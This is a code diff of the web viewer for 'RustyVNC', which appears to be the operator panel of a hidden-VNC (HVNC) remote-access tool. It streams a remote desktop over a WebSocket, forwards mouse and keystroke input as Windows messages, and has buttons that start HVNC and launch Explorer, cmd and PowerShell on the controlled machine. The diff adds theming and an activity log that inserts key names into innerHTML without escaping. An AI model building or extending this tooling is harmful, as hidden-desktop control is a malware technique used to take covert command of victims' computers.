@@ -5,20 +5,92 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>RustyVNC</title>
   <style>
-    :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
-    body { margin: 0; background: #191b1f; color: #d9d4c7; }
-    header { height: 52px; display: flex; align-items: center; gap: 12px; padding: 0 18px; border-bottom: 1px solid #30343a; background: #202329; }
-    button, select, input { background: #242830; color: #d9d4c7; border: 1px solid #565d68; border-radius: 4px; padding: 7px 10px; font: inherit; }
-    button { cursor: pointer; }
-    button.primary { border-color: #b6c20f; color: #d4df2a; }
-    button.danger { border-color: #dd665c; color: #ff7f75; }
-    main { display: grid; grid-template-rows: auto 1fr; height: calc(100vh - 53px); }
-    .bar { display: flex; align-items: center; gap: 10px; padding: 12px 18px; border-bottom: 1px solid #30343a; }
-    .status { margin-left: auto; color: #9fa6b2; font-size: 12px; }
-    .stage { display: flex; align-items: center; justify-content: center; overflow: hidden; background: #111317; }
+    :root {
+      color-scheme: dark;
+      --bg: #282828;
+      --bg-h: #1d2021;
+      --bg-s: #32302f;
+      --bg1: #3c3836;
+      --bg2: #504945;
+      --fg: #ebdbb2;
+      --fg2: #d5c4a1;
+      --fg4: #a89984;
+      --red: #fb4934;
+      --green: #b8bb26;
+      --yellow: #fabd2f;
+      --blue: #83a598;
+      --aqua: #8ec07c;
+      --orange: #fe8019;
+      font-family: Iosevka, "Fira Code", "Cascadia Code", "JetBrains Mono", Consolas, monospace;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; background: var(--bg); color: var(--fg); }
+    header {
+      height: 52px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0 18px;
+      border-bottom: 1px solid var(--bg2);
+      background: var(--bg-h);
+    }
+    strong { color: var(--yellow); }
+    button, input { font: inherit; }
+    button {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      min-height: 34px;
+      background: var(--bg1);
+      color: var(--fg2);
+      border: 0;
+      border-radius: 3px;
+      padding: 7px 10px;
+      cursor: pointer;
+    }
+    button:hover { background: var(--bg2); color: var(--fg); }
+    button.primary { color: var(--green); }
+    button.danger { color: var(--red); }
+    main { display: grid; grid-template-rows: auto 1fr auto; height: calc(100vh - 53px); }
+    .bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 18px;
+      border-bottom: 1px solid var(--bg1);
+      background: var(--bg);
+    }
+    .status { margin-left: auto; color: var(--fg4); font-size: 12px; }
+    .stage { display: flex; align-items: center; justify-content: center; overflow: hidden; background: var(--bg-h); }
     canvas { max-width: 100%; max-height: 100%; outline: none; cursor: crosshair; background: #000; }
-    .pill { border: 1px solid #565d68; border-radius: 999px; padding: 4px 9px; font-size: 12px; }
-    .ok { color: #b6c20f; border-color: #b6c20f; }
+    .pill {
+      background: var(--bg1);
+      color: var(--fg4);
+      border-radius: 3px;
+      padding: 4px 9px;
+      font-size: 12px;
+    }
+    .ok { color: var(--green); background: rgba(184, 187, 38, .12); }
+    .icon { width: 15px; height: 15px; stroke: currentColor; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; flex: 0 0 auto; }
+    .quality { display: inline-flex; align-items: center; gap: 8px; color: var(--fg2); }
+    input[type="range"] { accent-color: var(--yellow); }
+    .activity {
+      min-height: 38px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 8px 18px;
+      background: var(--bg);
+      color: var(--fg4);
+      font-size: 12px;
+      overflow: hidden;
+      white-space: nowrap;
+      box-shadow: 0 -1px 0 var(--bg1);
+    }
+    .activity strong { color: var(--orange); font-weight: 600; }
+    .activity-log { display: flex; align-items: center; gap: 12px; min-width: 0; overflow: hidden; }
+    .event { color: var(--fg4); }
+    .event b { color: var(--aqua); font-weight: 500; }
   </style>
 </head>
 <body>
@@ -29,17 +101,38 @@
   </header>
   <main>
     <section class="bar">
-      <button id="start" class="primary">Start</button>
-      <button id="stop" class="danger">Stop</button>
-      <button data-launch="explorer">Explorer</button>
-      <button data-launch="cmd">CMD</button>
-      <button data-launch="powershell">PowerShell</button>
-      <label>Quality <input id="quality" type="range" min="10" max="95" step="5" value="70"></label>
+      <button id="start" class="primary" title="Start HVNC">
+        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polygon points="6 3 20 12 6 21 6 3"></polygon></svg>
+        <span>Start</span>
+      </button>
+      <button id="stop" class="danger" title="Stop HVNC">
+        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="6" y="6" width="12" height="12" rx="1"></rect></svg>
+        <span>Stop</span>
+      </button>
+      <button data-launch="explorer" title="Launch Explorer">
+        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 7h5l2 2h11v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><path d="M3 7V5a2 2 0 0 1 2-2h4l2 2h4"></path></svg>
+        <span>Explorer</span>
+      </button>
+      <button data-launch="cmd" title="Launch cmd">
+        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+        <span>CMD</span>
+      </button>
+      <button data-launch="powershell" title="Launch PowerShell">
+        <svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><polyline points="4 17 10 11 4 5"></polyline><path d="M12 17h8"></path><path d="M3 3h18v18H3z"></path></svg>
+        <span>PowerShell</span>
+      </button>
+      <label class="quality">Quality <input id="quality" type="range" min="10" max="95" step="5" value="70"></label>
       <span id="qualityText">70</span>
       <span id="status" class="status">connecting...</span>
     </section>
     <section class="stage">
       <canvas id="view" tabindex="0"></canvas>
+    </section>
+    <section class="activity">
+      <strong>activity</strong>
+      <div id="activityLog" class="activity-log">
+        <span class="event">viewer loaded</span>
+      </div>
     </section>
   </main>
   <script>
@@ -50,9 +143,11 @@
     const activeEl = document.getElementById('active');
     const quality = document.getElementById('quality');
     const qualityText = document.getElementById('qualityText');
+    const activityLog = document.getElementById('activityLog');
     let ws;
     let remoteW = 0;
     let remoteH = 0;
+    let lastStatus = '';
 
     const vk = {
       Backspace: 0x08, Tab: 0x09, Enter: 0x0D, Escape: 0x1B, ' ': 0x20,
@@ -64,9 +159,13 @@
     function connect() {
       ws = new WebSocket(`wss://${location.host}/ws/viewer${location.search}`);
       ws.binaryType = 'arraybuffer';
-      ws.onopen = () => send({ type: 'status' });
+      ws.onopen = () => {
+        logEvent('wss', 'viewer connected');
+        send({ type: 'status' }, false);
+      };
       ws.onclose = () => {
         statusEl.textContent = 'disconnected; retrying...';
+        logEvent('wss', 'viewer disconnected');
         setTimeout(connect, 1000);
       };
       ws.onmessage = event => {
@@ -75,8 +174,11 @@
       };
     }
 
-    function send(obj) {
-      if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(obj));
+    function send(obj, record = true) {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify(obj));
+        if (record) logEvent('sent', eventLabel(obj));
+      }
     }
 
     function updateStatus(s) {
@@ -86,6 +188,11 @@
       activeEl.className = s.active ? 'pill ok' : 'pill';
       const dims = s.width && s.height ? ` ${s.width}x${s.height}` : '';
       statusEl.textContent = `${s.message || 'ready'}${dims} frame=${s.frame_seq || 0}`;
+      const status = `${s.connected ? 'client' : 'no client'} / ${s.active ? 'active' : 'inactive'} / frame=${s.frame_seq || 0}`;
+      if (status !== lastStatus) {
+        lastStatus = status;
+        logEvent('status', status);
+      }
     }
 
     function drawFrame(buf) {
@@ -99,6 +206,7 @@
         canvas.height = bitmap.height;
         ctx.drawImage(bitmap, 0, 0);
         bitmap.close();
+        logEvent('frame', `${remoteW}x${remoteH}`);
       });
     }
 
@@ -110,11 +218,25 @@
       const rect = canvas.getBoundingClientRect();
       const x = Math.max(0, Math.min(remoteW || canvas.width, Math.round((event.clientX - rect.left) * (remoteW || canvas.width) / rect.width)));
       const y = Math.max(0, Math.min(remoteH || canvas.height, Math.round((event.clientY - rect.top) * (remoteH || canvas.height) / rect.height)));
-      return (y << 16) | (x & 0xffff);
+      return (((y & 0xffff) << 16) | (x & 0xffff)) >>> 0;
     }
 
     function input(msg, wparam, lparam) {
-      send({ type: 'input', msg, wparam, lparam });
+      send({ type: 'input', msg, wparam, lparam }, false);
+    }
+
+    function eventLabel(obj) {
+      if (obj.type === 'start') return `start quality=${obj.quality}`;
+      if (obj.type === 'launch') return `launch ${obj.action}`;
+      return obj.type;
+    }
+
+    function logEvent(kind, text) {
+      const item = document.createElement('span');
+      item.className = 'event';
+      item.innerHTML = `<b>${kind}</b> ${text}`;
+      activityLog.appendChild(item);
+      while (activityLog.children.length > 6) activityLog.removeChild(activityLog.firstElementChild);
     }
 
     document.getElementById('start').onclick = () => send({ type: 'start', quality: Number(quality.value) });
@@ -128,6 +250,7 @@
     canvas.addEventListener('mousedown', e => {
       canvas.focus();
       input(e.button === 2 ? 0x0204 : e.button === 1 ? 0x0207 : 0x0201, 1, coords(e));
+      logEvent('input', 'mouse down');
       e.preventDefault();
     });
     canvas.addEventListener('mouseup', e => {
@@ -144,11 +267,12 @@
       const code = vk[e.key] || (e.key.length === 1 ? e.key.toUpperCase().charCodeAt(0) : 0);
       if (code) input(0x0100, code, 1);
       if (e.key.length === 1) input(0x0102, e.key.charCodeAt(0), 1);
+      logEvent('input', `key ${e.key}`);
       e.preventDefault();
     });
     canvas.addEventListener('keyup', e => {
       const code = vk[e.key] || (e.key.length === 1 ? e.key.toUpperCase().charCodeAt(0) : 0);
-      if (code) input(0x0101, code, (1 << 31) | (1 << 30) | 1);
+      if (code) input(0x0101, code, ((1 << 31) | (1 << 30) | 1) >>> 0);
       e.preventDefault();
     });
 
